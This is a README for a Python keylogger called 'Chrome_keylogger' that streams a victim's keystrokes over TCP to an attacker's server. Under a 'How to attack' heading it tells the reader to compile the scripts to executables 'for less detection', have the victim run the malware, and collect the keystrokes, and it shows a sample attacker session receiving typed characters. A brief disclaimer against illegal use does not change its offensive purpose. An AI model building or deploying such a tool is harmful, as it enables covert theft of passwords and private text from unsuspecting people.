# Important: 
I wrote this code as a 13 year old kid, it's terrible, disorganized and clumsy. You could call it 'Spaghetti' code, for sure. 
If you're interested in taking a look at the code, then just be careful as that might burn your eyes.
Oh, and one more thing, *do not* use this tool to do devious and illegal things. Be safe kids!
.
.
.
# Chrome_keylogger
A keylogger that shares keystrokes over a local TCP connection.

## How to attack:
First of all, you can edit the code a bit and compile all the scripts into exe for less detection.

Follow these steps:

  - The attacker must run the server script then bind the server's IP and port. 
  - The victim must run the malware, as soon as the malware starts, the keylogger will start and the TCP client script will automatically connect to the TCP server.
  - The attacker will start receiving keystrokes from the victim's computer.

## Deeper demonstration:
Attacker:
    
    attacker@kali:~$ python3 server.py
    
    IP: 192.168.x.x
    Port: 8080
    Client (client_ip) connected.
    
    2020-10-12 22:05:35,120: 'h'
    2020-10-12 22:05:35,390: 'i'
    2020-10-12 22:05:36,258: Key.space
    2020-10-12 22:05:36,631: 't'
    2020-10-12 22:05:36,806: 'h'
    2020-10-12 22:05:36,963: 'e'
    2020-10-12 22:05:37,080: 'r'
    2020-10-12 22:05:37,168: 'e'
    
Victim:

    victim@kali:~$ python3 program.py    
